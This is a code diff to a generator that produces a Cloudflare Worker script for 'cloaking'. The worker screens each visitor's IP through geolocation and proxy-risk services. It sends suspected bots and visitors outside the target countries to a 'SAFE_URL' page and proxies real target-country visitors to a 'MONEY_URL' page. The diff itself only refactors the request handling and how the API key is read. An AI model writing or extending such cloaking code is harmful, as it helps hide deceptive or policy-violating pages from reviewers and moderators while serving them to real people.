@@ -747,8 +747,7 @@ export function generateJciWorkerScript(options: {
 // This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
 
 // --- CONFIGURATION ---
-// API Key for proxycheck.io - Get this from environment variables
-const PROXYCHECK_API_KEY = typeof env !== 'undefined' ? env.PROXYCHECK_API_KEY : 'YOUR_PROXYCHECK_API_KEY_HERE';
+// API Key for proxycheck.io - Set in Cloudflare Worker environment variables
 
 // Target Countries - Allowed countries for real traffic (country codes)
 const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
@@ -758,8 +757,11 @@ const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
 // --- END CONFIGURATION ---
 
-export default {
-  async fetch(request, env, ctx) {
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
   const url = new URL(request.url);
 
   // ROUTE 1: Serve the service worker script itself when the browser requests it.
@@ -801,9 +803,9 @@ self.addEventListener('fetch', event => {
     }
     
     // ROUTE 3: Handle the initial page load with cloaking logic.
-    return handleMainRequest(request, env);
+    return handleMainRequest(request);
   }
-};
+}
 
 // --- CORE FUNCTIONS ---
 
@@ -814,9 +816,9 @@ self.addEventListener('fetch', event => {
  * @param {Object} env Environment variables containing API keys.
  * @returns {Promise<boolean>} Returns true if the visitor should be blocked, false otherwise.
  */
-async function isVisitorABot(request, env) {
+async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
-  const apiKey = env?.PROXYCHECK_API_KEY || PROXYCHECK_API_KEY;
+  const apiKey = PROXYCHECK_API_KEY || 'YOUR_PROXYCHECK_API_KEY_HERE';
   const riskThreshold = 75; // Block visitors with risk score >= 75
   
   // Step 1: Country Check (ip-api.com) - Quick pre-filter
@@ -889,9 +891,9 @@ async function isVisitorABot(request, env) {
 }
 
 // Proxies the main HTML page and rewrites its content.
-async function handleMainRequest(request, env) {
+async function handleMainRequest(request) {
   try {
-    const isBot = await isVisitorABot(request, env);
+    const isBot = await isVisitorABot(request);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
     const response = await fetch(targetUrl, request);
